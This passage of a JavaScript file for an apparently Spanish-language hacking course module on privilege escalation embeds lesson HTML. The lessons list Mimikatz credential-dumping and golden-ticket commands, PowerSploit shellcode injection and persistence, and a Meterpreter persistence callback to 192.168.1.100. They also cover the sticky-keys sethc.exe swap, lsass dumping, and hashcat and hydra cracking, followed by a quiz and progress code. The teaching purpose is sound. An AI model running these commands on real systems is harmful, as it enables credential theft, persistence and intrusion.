                    <p>Mimikatz es la herramienta líder para extracción de credenciales de memoria en sistemas Windows, capaz de obtener contraseñas, hashes y tickets Kerberos.</p>
                    
                    <div class="mimikatz-features">
                        <h5>Capacidades Principales de Mimikatz:</h5>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="feature-section">
                                    <h6><i class="fas fa-key me-2 text-primary"></i>Extracción de Credenciales</h6>
                                    <div class="command-examples">
                                        <div class="command-item">
                                            <code>sekurlsa::logonpasswords</code>
                                            <small>Extrae passwords en texto plano de LSASS</small>
                                        </div>
                                        <div class="command-item">
                                            <code>sekurlsa::wdigest</code>
                                            <small>Obtiene credenciales WDigest</small>
                                        </div>
                                        <div class="command-item">
                                            <code>sekurlsa::tspkg</code>
                                            <small>Extrae credenciales TsPkg</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="feature-section">
                                    <h6><i class="fas fa-ticket-alt me-2 text-success"></i>Manipulación Kerberos</h6>
                                    <div class="command-examples">
                                        <div class="command-item">
                                            <code>kerberos::list</code>
                                            <small>Lista tickets Kerberos</small>
                                        </div>
                                        <div class="command-item">
                                            <code>kerberos::ptt ticket.kirbi</code>
                                            <small>Pass-the-ticket</small>
                                        </div>
                                        <div class="command-item">
                                            <code>kerberos::golden</code>
                                            <small>Golden ticket generation</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="feature-section">
                                    <h6><i class="fas fa-database me-2 text-warning"></i>Volcado de SAM</h6>
                                    <div class="command-examples">
                                        <div class="command-item">
                                            <code>lsadump::sam</code>
                                            <small>Volcado de hashes SAM</small>
                                        </div>
                                        <div class="command-item">
                                            <code>lsadump::secrets</code>
                                            <small>Extrae LSA secrets</small>
                                        </div>
                                        <div class="command-item">
                                            <code>lsadump::cache</code>
                                            <small>Credenciales en caché</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="feature-section">
                                    <h6><i class="fas fa-shield-alt me-2 text-info"></i>Bypass de Protecciones</h6>
                                    <div class="command-examples">
                                        <div class="command-item">
                                            <code>privilege::debug</code>
                                            <small>Obtiene privilegio SeDebug</small>
                                        </div>
                                        <div class="command-item">
                                            <code>token::elevate</code>
                                            <small>Eleva privilegios con tokens</small>
                                        </div>
                                        <div class="command-item">
                                            <code>misc::skeleton</code>
                                            <small>Instala skeleton key</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="mimikatz-usage mt-4">
                        <h5>Secuencia de Uso Típica:</h5>
                        <div class="usage-sequence">
                            <div class="row text-center">
                                <div class="col-md-3">
                                    <div class="sequence-step">
                                        <div class="step-number">1</div>
                                        <div class="step-title">Elevación</div>
                                        <code>privilege::debug</code>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="sequence-step">
                                        <div class="step-number">2</div>
                                        <div class="step-title">Extracción</div>
                                        <code>sekurlsa::logonpasswords</code>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="sequence-step">
                                        <div class="step-number">3</div>
                                        <div class="step-title">Movimiento</div>
                                        <code>sekurlsa::pth</code>
                                    </div>
                                </div>
                                <div class="col-md-3">
                                    <div class="sequence-step">
                                        <div class="step-number">4</div>
                                        <div class="step-title">Persistencia</div>
                                        <code>kerberos::golden</code>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-powershell"></use>
                        </svg>
                        PowerSploit
                    </h4>
                    <p>Framework PowerShell para post-explotación que proporciona módulos especializados para escalamiento de privilegios y persistencia en entornos Windows.</p>
                    
                    <div class="powersploit-modules">
                        <h5>Módulos Principales de PowerSploit:</h5>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="tool-highlight">
                                    <h6><i class="fas fa-arrow-up me-2 text-primary"></i>PowerUp</h6>
                                    <p>Módulo especializado en escalamiento de privilegios que identifica configuraciones incorrectas comunes.</p>
                                    <div class="tool-examples">
                                        <div class="example-item">
                                            <strong>Análisis completo:</strong>
                                            <pre class="command-block">Import-Module PowerUp.ps1; Invoke-AllChecks</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Servicios vulnerables:</strong>
                                            <pre class="command-block">Get-ServiceUnquoted -Verbose</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Permisos de servicios:</strong>
                                            <pre class="command-block">Get-ModifiableServiceFile -Verbose</pre>
                                        </div>
                                    </div>
                                    
                                    <div class="alert alert-info mt-3">
                                        <small><i class="fas fa-lightbulb me-2"></i>
                                        <strong>Características:</strong> Detecta unquoted service paths, weak service permissions, AlwaysInstallElevated y más.</small>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="tool-highlight">
                                    <h6><i class="fas fa-cog me-2 text-success"></i>PowerView</h6>
                                    <p>Herramienta de enumeración de Active Directory para reconocimiento de dominio y escalamiento lateral.</p>
                                    <div class="tool-examples">
                                        <div class="example-item">
                                            <strong>Enumeración de dominio:</strong>
                                            <pre class="command-block">Get-NetDomain -Verbose</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Usuarios privilegiados:</strong>
                                            <pre class="command-block">Get-NetUser -AdminCount</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Relaciones de confianza:</strong>
                                            <pre class="command-block">Get-NetDomainTrust</pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="scanner-tool">
                                    <h6><i class="fas fa-syringe me-2 text-warning"></i>CodeExecution</h6>
                                    <p>Módulos para ejecución de código y técnicas de inyección en procesos.</p>
                                    <ul class="features-list">
                                        <li>Invoke-Shellcode - Inyección de shellcode</li>
                                        <li>Invoke-DllInjection - Inyección de DLL</li>
                                        <li>Invoke-ReflectivePEInjection - PE injection</li>
                                        <li>Invoke-WmiCommand - Ejecución vía WMI</li>
                                    </ul>
                                    <div class="usage-example">
                                        <small><strong>Ejemplo:</strong></small>
                                        <pre class="mini-command">Invoke-Shellcode -ProcessID 1234 -Shellcode $buf</pre>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="scanner-tool">
                                    <h6><i class="fas fa-clock me-2 text-info"></i>Persistence</h6>
                                    <p>Técnicas de persistencia para mantener acceso en sistemas comprometidos.</p>
                                    <ul class="features-list">
                                        <li>Add-Persistence - Persistencia WMI</li>
                                        <li>Install-SSP - Security Support Provider</li>
                                        <li>Get-SecurityPackages - Enumera SSPs</li>
                                        <li>New-ElevatedPersistenceOption - Opciones elevadas</li>
                                    </ul>
                                    <div class="usage-example">
                                        <small><strong>Comando:</strong></small>
                                        <pre class="mini-command">Add-Persistence -FilePath payload.ps1 -ElevatedPersistence</pre>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-metasploit"></use>
                        </svg>
                        Metasploit Framework
                    </h4>
                    <p>Framework de penetration testing que incluye módulos especializados para escalamiento de privilegios y post-explotación.</p>
                    
                    <div class="metasploit-capabilities">
                        <h5>Módulos de Escalamiento en Metasploit:</h5>
                        <div class="accordion" id="metasploitAccordion">
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseLocalExploits">
                                        Local Exploits para Escalamiento
                                    </button>
                                </h2>
                                <div id="collapseLocalExploits" class="accordion-collapse collapse show" data-bs-parent="#metasploitAccordion">
                                    <div class="accordion-body">
                                        <div class="metasploit-examples">
                                            <div class="example-item">
                                                <strong>Windows Kernel Exploits:</strong>
                                                <pre class="command-block">use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</pre>
                                                <small>Secondary Logon Handle Privilege Escalation</small>
                                            </div>
                                            <div class="example-item">
                                                <strong>Linux Privilege Escalation:</strong>
                                                <pre class="command-block">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</pre>
                                                <small>PwnKit Local Privilege Escalation</small>
                                            </div>
                                            <div class="example-item">
                                                <strong>UAC Bypass:</strong>
                                                <pre class="command-block">use exploit/windows/local/bypassuac_fodhelper</pre>
                                                <small>Windows UAC Protection Bypass (Via FodHelper Registry Key)</small>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseMeterpreter">
                                        Meterpreter para Post-Explotación
                                    </button>
                                </h2>
                                <div id="collapseMeterpreter" class="accordion-collapse collapse" data-bs-parent="#metasploitAccordion">
                                    <div class="accordion-body">
                                        <div class="meterpreter-commands">
                                            <div class="command-category">
                                                <h6><i class="fas fa-user-shield me-2"></i>Escalamiento de Privilegios</h6>
                                                <div class="command-item">
                                                    <code>getsystem</code>
                                                    <small>Intenta obtener privilegios SYSTEM automáticamente</small>
                                                </div>
                                                <div class="command-item">
                                                    <code>getprivs</code>
                                                    <small>Muestra privilegios del token actual</small>
                                                </div>
                                                <div class="command-item">
                                                    <code>use incognito</code>
                                                    <small>Carga módulo para impersonación de tokens</small>
                                                </div>
                                            </div>
                                            
                                            <div class="command-category mt-3">
                                                <h6><i class="fas fa-key me-2"></i>Extracción de Credenciales</h6>
                                                <div class="command-item">
                                                    <code>hashdump</code>
                                                    <small>Extrae hashes de contraseñas SAM</small>
                                                </div>
                                                <div class="command-item">
                                                    <code>run post/windows/gather/smart_hashdump</code>
                                                    <small>Volcado inteligente de hashes</small>
                                                </div>
                                                <div class="command-item">
                                                    <code>load kiwi</code>
                                                    <small>Carga extensión Mimikatz</small>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePostModules">
                                        Módulos Post-Explotación
                                    </button>
                                </h2>
                                <div id="collapsePostModules" class="accordion-collapse collapse" data-bs-parent="#metasploitAccordion">
                                    <div class="accordion-body">
                                        <div class="post-modules">
                                            <div class="module-item">
                                                <strong>Enumeración del sistema:</strong>
                                                <pre class="command-block">run post/windows/gather/enum_applications</pre>
                                                <small>Enumera aplicaciones instaladas</small>
                                            </div>
                                            <div class="module-item">
                                                <strong>Búsqueda de archivos:</strong>
                                                <pre class="command-block">run post/windows/gather/enum_files</pre>
                                                <small>Busca archivos sensibles</small>
                                            </div>
                                            <div class="module-item">
                                                <strong>Persistencia:</strong>
                                                <pre class="command-block">run persistence -S -U -X -i 10 -p 4444 -r 192.168.1.100</pre>
                                                <small>Establece persistencia automática</small>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-windows-tools"></use>
                        </svg>
                        Herramientas Especializadas de Windows
                    </h4>
                    <p>Herramientas específicas de Windows que aprovechan características del sistema operativo para escalamiento y persistencia.</p>
                    
                    <div class="windows-tools">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="tool-section">
                                    <h6><i class="fas fa-keyboard me-2 text-primary"></i>Sticky Keys Attack</h6>
                                    <p>Técnica que aprovecha la función de accesibilidad Sticky Keys para obtener acceso privilegiado.</p>
                                    <div class="sticky-keys-process">
                                        <div class="process-step">
                                            <strong>Paso 1 - Backup:</strong>
                                            <pre class="command-block">copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc.exe.bak</pre>
                                        </div>
                                        <div class="process-step">
                                            <strong>Paso 2 - Reemplazo:</strong>
                                            <pre class="command-block">copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe</pre>
                                        </div>
                                        <div class="process-step">
                                            <strong>Paso 3 - Activación:</strong>
                                            <small>Presionar Shift 5 veces en pantalla de login para obtener cmd con privilegios SYSTEM</small>
                                        </div>
                                    </div>
                                    
                                    <div class="alert alert-warning mt-3">
                                        <small><i class="fas fa-exclamation-triangle me-2"></i>
                                        <strong>Variantes:</strong> También funciona con utilman.exe, narrator.exe y osk.exe</small>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="tool-section">
                                    <h6><i class="fas fa-tools me-2 text-success"></i>Windows Sysinternals</h6>
                                    <p>Suite de herramientas administrativas que pueden ser utilizadas para escalamiento y análisis del sistema.</p>
                                    <div class="sysinternals-tools">
                                        <div class="tool-item">
                                            <strong>PsExec:</strong>
                                            <pre class="command-block">psexec.exe -i -s cmd.exe</pre>
                                            <small>Ejecuta procesos con privilegios SYSTEM</small>
                                        </div>
                                        <div class="tool-item">
                                            <strong>AccessChk:</strong>
                                            <pre class="command-block">accesschk.exe -uwcqv "Authenticated Users" *</pre>
                                            <small>Verifica permisos de archivos y servicios</small>
                                        </div>
                                        <div class="tool-item">
                                            <strong>ProcDump:</strong>
                                            <pre class="command-block">procdump.exe -ma lsass.exe lsass.dmp</pre>
                                            <small>Crea dump de procesos para análisis offline</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-injection"></use>
                        </svg>
                        Técnicas de Process Injection
                    </h4>
                    <p>Métodos avanzados para inyectar código en procesos legítimos para evasión y escalamiento de privilegios.</p>
                    
                    <div class="injection-techniques">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="injection-category">
                                    <h5><i class="fas fa-syringe me-2"></i>Métodos de Inyección</h5>
                                    <div class="injection-grid">
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="injection-method">
                                                    <h6>DLL Injection</h6>
                                                    <p>Inyecta una DLL maliciosa en el espacio de memoria de un proceso legítimo.</p>
                                                    <div class="method-steps">
                                                        <small><strong>Pasos:</strong></small>
                                                        <ol class="small">
                                                            <li>OpenProcess() - Abre handle del proceso objetivo</li>
                                                            <li>VirtualAllocEx() - Reserva memoria en proceso</li>
                                                            <li>WriteProcessMemory() - Escribe ruta de DLL</li>
                                                            <li>CreateRemoteThread() - Ejecuta LoadLibrary</li>
                                                        </ol>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="injection-method">
                                                    <h6>Process Hollowing</h6>
                                                    <p>Crea un proceso suspendido y reemplaza su código con payload malicioso.</p>
                                                    <div class="method-steps">
                                                        <small><strong>Técnica:</strong></small>
                                                        <ol class="small">
                                                            <li>CreateProcess() con CREATE_SUSPENDED</li>
                                                            <li>NtUnmapViewOfSection() - Desmapea imagen</li>
                                                            <li>VirtualAllocEx() - Aloca nueva memoria</li>
                                                            <li>WriteProcessMemory() - Escribe payload</li>
                                                            <li>ResumeThread() - Reanuda ejecución</li>
                                                        </ol>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row mt-3">
                                            <div class="col-md-6">
                                                <div class="injection-method">
                                                    <h6>Thread Execution Hijacking</h6>
                                                    <p>Secuestra threads existentes para ejecutar código malicioso.</p>
                                                    <div class="method-example">
                                                        <code>SuspendThread() → SetThreadContext() → ResumeThread()</code>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="injection-method">
                                                    <h6>Atom Bombing</h6>
                                                    <p>Utiliza la tabla global de átomos para inyección cross-process.</p>
                                                    <div class="method-example">
                                                        <code>GlobalAddAtom() → NtQueueApcThread()</code>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-password-crack"></use>
                        </svg>
                        Herramientas de Cracking de Contraseñas
                    </h4>
                    <p>Herramientas especializadas para romper contraseñas y hashes obtenidos durante el proceso de escalamiento.</p>
                    
                    <div class="password-tools">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="tool-highlight">
                                    <h6><i class="fas fa-hammer me-2 text-primary"></i>John The Ripper</h6>
                                    <p>Herramienta de cracking de contraseñas multiplataforma integrada en Kali Linux.</p>
                                    <div class="tool-examples">
                                        <div class="example-item">
                                            <strong>Crack hashes NTLM:</strong>
                                            <pre class="command-block">john --format=NT hashes.txt</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Wordlist attack:</strong>
                                            <pre class="command-block">john --wordlist=rockyou.txt hashes.txt</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Mostrar passwords:</strong>
                                            <pre class="command-block">john --show hashes.txt</pre>
                                        </div>
                                    </div>
                                    
                                    <div class="john-modes mt-3">
                                        <h7>Modos de Ataque:</h7>
                                        <ul class="small">
                                            <li><strong>Single crack:</strong> Usa información del usuario</li>
                                            <li><strong>Wordlist:</strong> Diccionario de contraseñas</li>
                                            <li><strong>Incremental:</strong> Brute force inteligente</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="tool-highlight">
                                    <h6><i class="fas fa-lock-open me-2 text-danger"></i>Cain & Abel</h6>
                                    <p>Suite de recovery de contraseñas para Windows con capacidades de cracking y sniffing.</p>
                                    <div class="cain-features">
                                        <div class="feature-item">
                                            <strong>LM/NTLM Hash Cracking:</strong>
                                            <p class="small">Ataque por diccionario y brute force a hashes Windows</p>
                                        </div>
                                        <div class="feature-item">
                                            <strong>Rainbow Tables:</strong>
                                            <p class="small">Usa tablas precalculadas para cracking rápido</p>
                                        </div>
                                        <div class="feature-item">
                                            <strong>Network Sniffing:</strong>
                                            <p class="small">Captura credenciales en tráfico de red</p>
                                        </div>
                                        <div class="feature-item">
                                            <strong>APR Poisoning:</strong>
                                            <p class="small">ARP poisoning para man-in-the-middle</p>
                                        </div>
                                    </div>
                                    
                                    <div class="alert alert-warning mt-3">
                                        <small><i class="fas fa-exclamation-triangle me-2"></i>
                                        <strong>Nota:</strong> Herramienta legacy, no actualizada recientemente pero aún funcional.</small>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="additional-tools mt-4">
                            <h5><i class="fas fa-plus me-2"></i>Herramientas Complementarias</h5>
                            <div class="row">
                                <div class="col-md-4">
                                    <div class="complementary-tool">
                                        <h6>Hashcat</h6>
                                        <p class="small">Cracking con aceleración GPU</p>
                                        <code>hashcat -m 1000 -a 0 hashes.txt rockyou.txt</code>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="complementary-tool">
                                        <h6>Hydra</h6>
                                        <p class="small">Brute force de servicios de red</p>
                                        <code>hydra -l admin -P passwords.txt ssh://target</code>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="complementary-tool">
                                        <h6>Medusa</h6>
                                        <p class="small">Login bruteforcer paralelo</p>
                                        <code>medusa -h target -u admin -P passwords.txt -M ssh</code>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="topic-quiz mt-4">
                    <h4>
                        <svg class="quiz-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-quiz"></use>
                        </svg>
                        Verifica tu Comprensión
                    </h4>
                    <div class="quiz-question">
                        <p><strong>¿Cuál es el comando principal de Mimikatz para extraer contraseñas en texto plano de la memoria?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_1" value="a">
                                <span>lsadump::sam</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_1" value="b">
                                <span>sekurlsa::logonpasswords</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_1" value="c">
                                <span>kerberos::list</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="quiz-question mt-3">
                        <p><strong>¿Qué módulo de PowerSploit se especializa en escalamiento de privilegios?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_2" value="a">
                                <span>PowerView</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_2" value="b">
                                <span>PowerUp</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_2" value="c">
                                <span>CodeExecution</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="quiz-question mt-3">
                        <p><strong>¿Cuál es el primer paso en un ataque Sticky Keys?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_3" value="a">
                                <span>Reemplazar sethc.exe con cmd.exe</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_3" value="b">
                                <span>Hacer backup de sethc.exe</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_tools_3" value="c">
                                <span>Presionar Shift 5 veces</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="quiz-actions mt-4">
                        <button class="btn btn-sena-primary" onclick="checkToolsQuizAnswers()">
                            <svg class="btn-icon me-2" width="16" height="16" viewBox="0 0 100 100">
                                <use href="../../assets/images/icons.svg#icon-check"></use>
                            </svg>
                            Verificar Respuestas
                        </button>
                    </div>
                </div>

                <div class="case-study mt-4">
                    <h4 class="text-center">
                        <svg class="case-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-case-study"></use>
                        </svg>
                        Caso de Estudio: Selección de Herramientas
                    </h4>
                    <div class="case-content">
                        <div class="case-scenario">
                            <h6>📚 Escenario:</h6>
                            <p>Has comprometido un servidor Windows 2019 como usuario estándar en un entorno de Active Directory. El objetivo es obtener privilegios de Domain Admin. El servidor tiene Windows Defender habilitado y logs de seguridad activos. Tienes acceso limitado a Internet desde el servidor.</p>
                        </div>
                        
                        <div class="case-question mt-3">
                            <h6>❓ Pregunta de Análisis:</h6>
                            <p><strong>¿Cuál sería la mejor secuencia de herramientas para lograr el objetivo de manera sigilosa?</strong></p>
                            <div class="case-options">
                                <button class="btn btn-outline-primary case-option" data-case="q_tools_case" data-value="a" onclick="handleToolsCaseStudy('q_tools_case', 'a')">
                                    A) Mimikatz → John The Ripper → PsExec para movimiento lateral
                                </button>
                                <button class="btn btn-outline-primary case-option" data-case="q_tools_case" data-value="b" onclick="handleToolsCaseStudy('q_tools_case', 'b')">
                                    B) PowerUp → PowerView → Mimikatz → Golden Ticket
                                </button>
                                <button class="btn btn-outline-primary case-option" data-case="q_tools_case" data-value="c" onclick="handleToolsCaseStudy('q_tools_case', 'c')">
                                    C) Metasploit local exploits → Meterpreter → hashdump
                                </button>
                            </div>
                            <div class="case-feedback" id="case-q_tools_case-feedback" style="display: none;"></div>
                        </div>
                    </div>
                </div>

                <div class="topic-actions mt-4">
                    <button class="btn btn-sena-primary" onclick="completeTopic(2)">
                        <svg class="btn-icon me-2" width="16" height="16" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-check"></use>
                        </svg>
                        Marcar como Completado
                    </button>
                </div>
            </div>
        `
    }
};

// ========================================
// SUBTOPIC CONTENT PLACEHOLDERS
// ========================================

const subtopicContents = {
    // Escalamiento Horizontal Subtopics
    'conceptos-horizontal': {
        title: 'Definición y Conceptos',
        content: `
            <div class="escalation-card">
                <div class="escalation-card-header">
                    <i class="fas fa-lightbulb me-2 text-info"></i>Conceptos Fundamentales
                </div>
                <div class="card-body">
                    <div class="content-placeholder">
                        <h5>Definición y Conceptos del Escalamiento Horizontal</h5>
                        <p class="text-muted">Contenido del tema pendiente de desarrollo...</p>
                        <div class="diagram-container" id="horizontal-concepts-diagram">
                            <!-- Diagrama será cargado aquí -->
                        </div>
                    </div>
                </div>
            </div>
        `
    },
    
    'tecnicas-movimiento': {
        title: 'Técnicas de Movimiento Lateral',
        content: `
            <div class="escalation-card">
                <div class="escalation-card-header">
                    <i class="fas fa-route me-2 text-primary"></i>Técnicas de Movimiento Lateral
                </div>
                <div class="card-body">
                    <div class="content-placeholder">
                        <h5>Técnicas de Movimiento Lateral</h5>
                        <p class="text-muted">Contenido del tema pendiente de desarrollo...</p>
                    </div>
                </div>
            </div>
        `
    },
    
    // Escalamiento Vertical Subtopics
    'fundamentos-vertical': {
        title: 'Fundamentos del Escalamiento Vertical',
        content: `
            <div class="escalation-card">
                <div class="escalation-card-header">
                    <i class="fas fa-foundation me-2"></i>Fundamentos del Escalamiento Vertical
                </div>
                <div class="card-body">
                    <div class="content-placeholder">
                        <h5>Fundamentos del Escalamiento Vertical</h5>
                        <p class="text-muted">Contenido del tema pendiente de desarrollo...</p>
                        <div class="diagram-container" id="vertical-fundamentals-diagram">
                            <!-- Diagrama será cargado aquí -->
                        </div>
                    </div>
                </div>
            </div>
        `
    },
    
    // Herramientas Subtopics
    'mimikatz-tool': {
        title: 'Mimikatz - Extracción de Credenciales',
        content: `
            <div class="escalation-card">
                <div class="escalation-card-header">
                    <i class="fas fa-memory me-2"></i>Mimikatz - Extracción de Credenciales
                </div>
                <div class="card-body">
                    <div class="content-placeholder">
                        <h5>Mimikatz - Herramienta de Extracción de Credenciales</h5>
                        <p class="text-muted">Contenido del tema pendiente de desarrollo...</p>
                        <div class="diagram-container" id="mimikatz-workflow-diagram">
                            <!-- Diagrama será cargado aquí -->
                        </div>
                    </div>
                </div>
            </div>
        `
    }
    
    // Nota: El resto de subtópicos seguirán el mismo patrón
    // pero sin contenido desarrollado según las instrucciones
};

// ========================================
// MODULE FUNCTIONS
// ========================================

// Initialize module
async function initializeModule() {
    try {
        console.log('🚀 Inicializando módulo: Escalamiento de Privilegios');
        
        loadSavedProgress();
        loadModuleNavigation();
        loadModuleProgress();
        updateProgressDisplay();
        
        console.log('✅ Módulo Escalamiento de Privilegios inicializado correctamente');
    } catch (error) {
        console.error('❌ Error inicializando módulo:', error);
    }
}

// Load saved progress from localStorage
function loadSavedProgress() {
    console.log(`[DEBUG] Loading saved progress...`);
    
    try {
        const savedProgress = localStorage.getItem('sena-hacking-progress');
        if (savedProgress) {
            const progressData = JSON.parse(savedProgress);
            const moduleProgressData = progressData[moduleData.id];
            
            if (moduleProgressData) {
                moduleProgress = moduleProgressData.progress || 0;
                
                if (moduleProgressData.completedTopics) {
                    moduleProgressData.completedTopics.forEach(topicId => {
                        const topic = moduleData.topics.find(t => t.id === topicId);
                        if (topic) topic.completed = true;
                    });
                }
            }
        }
        
        // Set current topic index
        const completedCount = moduleData.topics.filter(t => t.completed).length;
        
        if (completedCount === 0) {
            currentTopicIndex = 0;
        } else if (completedCount < moduleData.topics.length) {
            const firstIncompleteIndex = moduleData.topics.findIndex(t => !t.completed);
            currentTopicIndex = firstIncompleteIndex >= 0 ? firstIncompleteIndex : 0;
        } else {
            currentTopicIndex = moduleData.topics.length - 1;
        }
        
        if (currentTopicIndex < 0 || currentTopicIndex >= moduleData.topics.length) {
            console.log(`[DEBUG] Invalid currentTopicIndex ${currentTopicIndex}, resetting to 0`);
            currentTopicIndex = 0;
        }
        
        console.log(`[DEBUG] Progress loaded: ${completedCount} completed, currentTopicIndex: ${currentTopicIndex}`);
    } catch (error) {
        console.error('Error loading module progress:', error);
        moduleProgress = 0;
        currentTopicIndex = 0;
        moduleData.topics.forEach(topic => topic.completed = false);
    }
}

// Load module progress
function loadModuleProgress() {
    const savedProgress = localStorage.getItem('sena-hacking-progress');
    if (savedProgress) {
        try {
            const progressData = JSON.parse(savedProgress);
            const moduleProgressData = progressData[moduleData.id];
            
            if (moduleProgressData) {
                moduleProgress = moduleProgressData.progress || 0;
                
                if (moduleProgressData.completedTopics) {
                    moduleProgressData.completedTopics.forEach(topicId => {
                        const topic = moduleData.topics.find(t => t.id === topicId);
                        if (topic) topic.completed = true;
                    });
                }
                
                updateProgressDisplay();
            }
        } catch (error) {
            console.warn('Error loading module progress:', error);
        }
    }
}

// Update progress display
function updateProgressDisplay() {
    const completedTopics = moduleData.topics.filter(t => t.completed).length;
    const totalTopics = moduleData.topics.length;
    const progressPercentage = totalTopics > 0 ? Math.round((completedTopics / totalTopics) * 100) : 0;
    
    // Update progress bar if exists
    const progressBar = document.querySelector('.progress-bar');
    if (progressBar) {
        progressBar.style.width = `${progressPercentage}%`;
        progressBar.setAttribute('aria-valuenow', progressPercentage);
        progressBar.textContent = `${progressPercentage}%`;
    }
    
    // Update progress text if exists
    const progressText = document.querySelector('.progress-text');
    if (progressText) {
        progressText.textContent = `${completedTopics} de ${totalTopics} temas completados`;
    }
    
    console.log(`[DEBUG] Progress updated: ${completedTopics}/${totalTopics} (${progressPercentage}%)`);
}

// Load module navigation
function loadModuleNavigation() {
    const nav = document.getElementById('module-nav');
    if (!nav) return;
    
    nav.innerHTML = '';
    
    moduleData.topics.forEach((topic, index) => {
        const navItem = document.createElement('a');
        navItem.className = `nav-item ${topic.completed ? 'completed' : ''} ${index === currentTopicIndex ? 'active' : ''}`;
        navItem.href = '#';
        navItem.dataset.topicIndex = index;
        navItem.dataset.topicId = topic.id;
        
        navItem.innerHTML = `
            <div class="nav-item-content">
                <div class="nav-item-icon">
                    <i class="fas fa-${topic.completed ? 'check-circle text-success' : 'circle text-muted'}"></i>
                </div>
                <div class="nav-item-info">
                    <h6 class="nav-item-title">${topic.title}</h6>
                    <small class="nav-item-duration">${topic.duration} min</small>
                </div>
            </div>
        `;
        
        navItem.addEventListener('click', function(e) {
            e.preventDefault();
            loadTopic(topic.id, index);
        });
        
        nav.appendChild(navItem);
    });
}

// Load specific topic
